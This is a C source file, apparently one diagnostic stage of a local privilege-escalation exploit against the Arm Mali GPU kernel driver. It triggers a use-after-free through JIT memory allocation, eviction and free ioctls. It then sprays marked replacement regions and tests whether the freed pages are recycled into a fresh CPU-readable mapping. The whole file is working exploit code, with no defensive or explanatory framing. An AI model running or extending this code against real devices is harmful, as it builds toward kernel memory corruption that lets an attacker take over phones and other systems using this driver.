/* diag2: after the UAF free, do the victim's freed pages recycle back into
 * this context's pool? Scan a fresh CPU-readable region for our markers.
 * Retry loop survives replacement misses.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <poll.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/mman.h>

typedef unsigned int __u32;
typedef unsigned short __u16;
typedef unsigned long long __u64;
typedef unsigned char __u8;

#include "mali_trona.h"

struct kbase_ioctl_mem_jit_init { __u64 va_pages; __u8 max_allocations; __u8 trim_level; __u8 padding[6]; };
#define KBASE_IOCTL_MEM_JIT_INIT _IOW(0x80, 14, struct kbase_ioctl_mem_jit_init)
struct kbase_ioctl_job_submit { __u64 addr; __u32 nr_atoms; __u32 stride; };
#define KBASE_IOCTL_JOB_SUBMIT _IOW(0x80, 2, struct kbase_ioctl_job_submit)
union kbase_ioctl_mem_query {
	struct { __u64 gpu_addr; __u64 query; } in;
	struct { __u64 value; } out;
};
#define KBASE_IOCTL_MEM_QUERY _IOWR(0x80, 6, union kbase_ioctl_mem_query)
#define KBASE_MEM_QUERY_COMMIT_SIZE ((__u64)1)
struct kbase_ioctl_mem_commit { __u64 gpu_addr; __u64 pages; };
#define KBASE_IOCTL_MEM_COMMIT _IOW(0x80, 20, struct kbase_ioctl_mem_commit)
struct base_dependency { __u8 atom_id; __u8 dependency_type; };
struct base_jd_atom_v2 {
	__u64 jc; __u64 udata[2]; __u64 extres_list;
	__u16 nr_extres; __u16 compat_core_req;
	struct base_dependency pre_dep[2];
	__u8 atom_number, prio, device_nr, padding;
	__u32 core_req;
};
struct base_jit_alloc_info {
	__u64 gpu_alloc_addr; __u64 va_pages; __u64 commit_pages; __u64 extent;
	__u8 id, bin_id, max_allocations, flags; __u8 padding[2]; __u16 usage_id;
};
#define BASE_JD_REQ_SOFT_JOB       ((__u32)1 << 9)
#define BASE_JD_REQ_SOFT_JIT_ALLOC (BASE_JD_REQ_SOFT_JOB | 0x9)
#define BASE_JD_REQ_SOFT_JIT_FREE  (BASE_JD_REQ_SOFT_JOB | 0xa)
#define PAGE_SHIFT 12
#define SPRAY_PAGES 25
#define SPRAY_NUM   192
#define FLUSH_SIZE  (0x1000 * 0x1000)
#define SPRAY_CPU   0
#define NUM_TRIALS  100

static int fd;
static __u64 gpu_va[SPRAY_NUM];
static __u8 atom_number = 1;

static void migrate_to_cpu(int i)
{
	unsigned long mask[16] = { 0 };
	mask[0] = 1UL << i;
	syscall(__NR_sched_setaffinity, gettid(), sizeof(mask), mask);
}

static __u64 mem_alloc_flags(__u64 pages, __u64 commit, __u64 flags)
{
	union kbase_ioctl_mem_alloc ma;
	memset(&ma, 0, sizeof(ma));
	ma.in.flags = flags;
	ma.in.va_pages = pages;
	ma.in.commit_pages = commit;
	if (ioctl(fd, KBASE_IOCTL_MEM_ALLOC, &ma) < 0) return 0;
	return ma.out.gpu_va;
}

static void *map_gpu_va(__u64 cookie, __u64 pages)
{
	return mmap(NULL, pages << PAGE_SHIFT, PROT_READ | PROT_WRITE, MAP_SHARED, fd, cookie);
}

static __u64 jit_alloc(__u8 id, __u64 pages, __u64 wb)
{
	struct base_jit_alloc_info info;
	struct base_jd_atom_v2 atom;
	memset(&info, 0, sizeof(info));
	memset(&atom, 0, sizeof(atom));
	info.id = id;
	info.gpu_alloc_addr = wb;
	info.va_pages = info.commit_pages = info.extent = pages;
	atom.jc = (__u64)&info;
	atom.atom_number = atom_number++;
	atom.core_req = BASE_JD_REQ_SOFT_JIT_ALLOC;
	atom.nr_extres = 1;
	struct kbase_ioctl_job_submit js = { (__u64)&atom, 1, sizeof(atom) };
	if (ioctl(fd, KBASE_IOCTL_JOB_SUBMIT, &js) < 0) return 0;
	struct pollfd pfd = { fd, POLLIN, 0 };
	poll(&pfd, 1, 2000);
	char evb[64]; read(fd, evb, sizeof(evb));
	return *(__u64 *)wb;
}

static void jit_free(__u8 id)
{
	__u8 free_id = id;
	struct base_jd_atom_v2 atom;
	memset(&atom, 0, sizeof(atom));
	atom.jc = (__u64)&free_id;
	atom.atom_number = atom_number++;
	atom.core_req = BASE_JD_REQ_SOFT_JIT_FREE;
	atom.nr_extres = 1;
	struct kbase_ioctl_job_submit js = { (__u64)&atom, 1, sizeof(atom) };
	ioctl(fd, KBASE_IOCTL_JOB_SUBMIT, &js);
	struct pollfd pfd = { fd, POLLIN, 0 };
	poll(&pfd, 1, 2000);
	char evb[64]; read(fd, evb, sizeof(evb));
}

int main(void)
{
	setvbuf(stdout, NULL, _IONBF, 0);
	migrate_to_cpu(SPRAY_CPU);
	fd = open("/dev/mali0", O_RDWR);
	if (fd < 0) { perror("open"); return 1; }
	struct kbase_ioctl_version_check vc = { 0, 0 };
	ioctl(fd, KBASE_IOCTL_VERSION_CHECK, &vc);
	struct kbase_ioctl_set_flags sf = { 0 };
	ioctl(fd, KBASE_IOCTL_SET_FLAGS, &sf);
	if (mmap(NULL, 0x1000, 0, MAP_SHARED, fd, BASE_MEM_MAP_TRACKING_HANDLE) == MAP_FAILED) { perror("track"); return 1; }
	struct kbase_ioctl_mem_jit_init ji = { 0 };
	ji.va_pages = 0x1000; ji.max_allocations = 255; ji.trim_level = 100;
	if (ioctl(fd, KBASE_IOCTL_MEM_JIT_INIT, &ji) < 0) { perror("JIT_INIT"); return 1; }

	__u8 jit_id = 1;
	for (int attempt = 0; attempt < 8; attempt++, jit_id++) {
		printf("[*] attempt %d\n", attempt);
		__u64 wbck = mem_alloc_flags(1, 1, BASE_MEM_SAME_VA|BASE_MEM_PROT_CPU_RD|BASE_MEM_PROT_GPU_RD|BASE_MEM_PROT_CPU_WR|BASE_MEM_PROT_GPU_WR);
		void *wb = map_gpu_va(wbck, 1);
		if (!wb || wb == MAP_FAILED) { perror("wb"); return 1; }
		*(__u64 *)wb = 0;
		__u64 jit_addr = jit_alloc(jit_id, SPRAY_PAGES, (__u64)wb);
		if (!jit_addr) continue;
		struct kbase_ioctl_mem_flags_change fc;
		fc.gpu_va = jit_addr; fc.mask = BASE_MEM_DONT_NEED; fc.flags = BASE_MEM_DONT_NEED;
		if (ioctl(fd, KBASE_IOCTL_MEM_FLAGS_CHANGE, &fc) < 0) continue;
		int evicted = 0;
		void *held[NUM_TRIALS];
		int nheld = 0;
		for (int i = 0; i < NUM_TRIALS && !evicted; i++) {
			union kbase_ioctl_mem_query q;
			memset(&q, 0, sizeof(q));
			q.in.gpu_addr = jit_addr; q.in.query = KBASE_MEM_QUERY_COMMIT_SIZE;
			migrate_to_cpu(SPRAY_CPU);
			char *f = mmap(NULL, FLUSH_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
			if (f != MAP_FAILED) { memset(f, i & 0xff, FLUSH_SIZE); held[nheld++] = f; }
			if (ioctl(fd, KBASE_IOCTL_MEM_QUERY, &q) < 0) evicted = 1;
		}
		for (int i = 0; i < nheld; i++) munmap(held[i], FLUSH_SIZE);
		if (!evicted) continue;
		printf("[+] evicted\n");

		/* spray replacement region objects, commit pages, mark them */
		for (int j = 0; j < SPRAY_NUM; j++) {
			__u64 ck = mem_alloc_flags(SPRAY_PAGES, 0, BASE_MEM_PROT_CPU_RD|BASE_MEM_PROT_GPU_RD|BASE_MEM_PROT_CPU_WR);
			void *r = map_gpu_va(ck, SPRAY_PAGES);
			if (!r || r == MAP_FAILED) { perror("spray"); return 1; }
			gpu_va[j] = (__u64)r;
		}
		for (int j = 0; j < SPRAY_NUM; j++) {
			struct kbase_ioctl_mem_commit mc = { gpu_va[j], SPRAY_PAGES };
			if (ioctl(fd, KBASE_IOCTL_MEM_COMMIT, &mc) < 0) { perror("commit"); return 1; }
			__u64 *p = (__u64 *)gpu_va[j];
			for (int k = 0; k < 32; k++) p[k] = 0xFEEDFACE0000ULL + j;
		}
		jit_free(jit_id);
		printf("[*] jit_free done\n");

		int freed_idx = -1;
		for (int j = 0; j < SPRAY_NUM; j++) {
			union kbase_ioctl_mem_query q;
			memset(&q, 0, sizeof(q));
			q.in.gpu_addr = gpu_va[j]; q.in.query = KBASE_MEM_QUERY_COMMIT_SIZE;
			if (ioctl(fd, KBASE_IOCTL_MEM_QUERY, &q) < 0) continue;
			if (q.out.value != SPRAY_PAGES) freed_idx = j;
		}
		if (freed_idx < 0) { printf("[-] miss\n"); continue; }
		printf("[+] freed_idx = %d\n", freed_idx);

		/* reclaim test: fresh region draws freed pool pages? */
		__u64 ck2 = mem_alloc_flags(256, 256, BASE_MEM_SAME_VA|BASE_MEM_PROT_CPU_RD|BASE_MEM_PROT_GPU_RD|BASE_MEM_PROT_CPU_WR|BASE_MEM_PROT_GPU_WR);
		void *r2 = map_gpu_va(ck2, 256);
		int hits = 0;
		if (r2 && r2 != MAP_FAILED) {
			for (int i = 0; i < 256 * (int)(0x1000/8); i++)
				if ((((__u64 *)r2)[i] & 0xFFFFFFFF0000ULL) == 0xFEEDFACE0000ULL) hits++;
		}
		printf("[diag] marker qwords recycled into fresh region: %d\n", hits);
		return 0;
	}
	printf("[-] exhausted\n");
	return 1;
}
